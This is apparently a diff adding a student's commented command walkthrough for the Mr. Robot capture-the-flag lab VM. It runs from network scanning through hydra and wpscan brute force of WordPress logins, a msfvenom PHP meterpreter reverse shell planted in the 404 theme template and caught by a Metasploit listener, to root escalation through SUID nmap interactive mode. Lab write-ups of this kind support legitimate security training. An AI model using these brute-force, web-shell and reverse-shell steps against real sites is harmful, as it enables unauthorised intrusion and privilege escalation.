@@ -1,0 +1,117 @@
+sudo arp-scan -l	#after input passwd,can see all of your IP
+sudo arp-scan -l
+#after change internet of mrrobot vm to NAT,you can see there add another IP when you use this command
+#in this case,my mrrobot IP is 192.168.81.131
+nmap -p- 192.168.81.131		
+#you can see which service state ip open,you can open firefox and write 'http://192.168.81.131' or 'https://192.168.81.131' as in my case the open state is http and https.
+#after enter the website,you can try a lot of commands.
+nikto -h http 192.168.81.131
+#you can see which directory may have some bugs and know which way can more easily decode the website.
+#in my case,you can see this website can be easily brute force files names.
+dirb http://192.168.81.131
+#you can observe a lot of website, and when you see 'CODE:200' means this website can be enter.
+#because we want to know access account and passwd, we need to verify whether robots.txt (in linux OS) can access or not.
+#in my case, you can observe there are two file named 'key-1-of-3.txt' and 'fsocity.dic'. The front file means there are totally 3 files to find answer, while the after files means you can find the other two files in that file.
+
+#if you use windows or ios, try to key .htaccess or .ds_dtore respectivitly.
+
+wc fsocity.dic
+#observe the tirst and third number, they means there are a lot of duplicated number.
+cat fsocity.dic | sort -u > dic.txt
+#-u means delete duplicated number,and store this results to the file name dic.txt
+
+#downnload FoxyProxy and create a localhost.
+#open burpsuite app. tempory, next, start.
+#go to burpsuite and click "Proxy, Intercept is on", go to FoxyProxy and open it.
+#go to website "http://192.168.81.131/wp-login.php" enter anything account and password.
+
+hydra -L dic.txt -p something 192.168.81.131 http-post-form-'/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+ln:F=Invalid username'
+sudo wpscan --url http://192.168.81.131/ --usernames elliot --passwords dic.txt
+#Now you get the password for account elliot
+
+#go to website "http://192.168.81.131/wp-login.php" and enter account.
+#end on May
+
+#start on 29 May
+
+#in firebox or other website.
+#1 step: please login "http://192.168.81.131/wp-admin/theme-editor.php" the 192.168.81.131 is your robot IP.
+#2 step: after login in, enter "Editor" page where it is on left side.
+#3 step: enter "404 Template" page where it is on right side.
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.81.130 lport=4444 -f raw
+#lhost is your VM IP, not robot IP
+#4 step: now use Ctrl+C to copy the words after "Payload size: xxx bytes " to attack VM robot. The data you complicate is because you use this instruction to generate malicious file which can let you hack into VM robot without input account and password. But as this payload is generated auto, you need to change 2 times authorities to hack into mr.robot VM.
+
+#in website
+#5 step: go to "http://192.168.81.131/wp-admin/theme-editor.php" and paste data in "404 Template" and click "Update File".
+
+msfconsole
+#waiting compute until you see a picture, everyone's picture is different.
+#The mode you see is like "msf6 >". This is the first time you change authority.
+
+use multi/handler
+#The mode you see is like "msf6 exploit(multi/handler)>"
+
+set payload php/meterpreter/reverse_tcp
+#You will see "payload => php/meterpreter..."
+
+set lhost 192.168.81.130
+#192.168.81.130 is your VM IP, not robot IP.
+#You will see "lhost => VM IP"
+
+set lport 4444
+#You will see "lport => 4444"
+
+run
+#You will see "Started reverse TCP handler on $VMIP:4444"
+
+#in website
+#Now go to website "https://robotIP/something other", I use "http://192.168.81.131/hacker".
+
+#back to terminal
+#You'll see "Sending stage (xxx bytes) to robotIP" and "Meterpreter session x opened ($VMIP:4444 -> robotIP:xxxxx) at yyyy-mmm-dd time +time_zone"
+#The mode you see is like "meterpreter >". This is the second time you change authority.
+
+#unnecessary
+id
+#You'll see "uid=1(daemon) gid=1(daemon) ...", the "daemon" may be other's name.
+
+shell
+
+#Congradulation that you are in robot console now.
+ls
+python -c 'import pty; pty.spawn("/bin/bash")'
+#It is to change mode to  "daemon@linux:/opt/bitnami/apps/wordpress/htdocs$". It means that you are in daemon's authority.
+
+cat /etc/shadow	 #you can see "Permission denied".
+find / -perm -u=s -type f 2>/dev/null
+ls -l /usr/local/bin/nmap
+#To confirm whether robot_VM have nmap tools.
+
+/usr/local/bin/nmap --version
+/usr/local/bin/nmap --interactive
+#if nmap version is very low, you can attack by known bug in nmap.
+
+cat /bin/shadow  #you'll see "Permission denied"
+!cat /bin/shadow #use root authority to execute this instruction.
+!/bin/sh
+#if you don't input this instruction, you'll add "!" in every below instructions.
+
+#if you try input id on line 70. you'ii observe different.
+id
+#You'll see "uid=1(daemon) gid=1(daemon) euid=0(root) groups=0(root),1(daemon)", the "daemon" may be other's name.
+
+ls
+#you'll see a file named "key-1-of-3.txt".
+
+cd /root
+ls
+#you'll see a file named "key-3-of-3.txt".
+
+cd /home
+ls
+cd robot
+ls
+#you'll see a file named "key-2-of-3.txt".
+#Congradulation you find all key in this file!
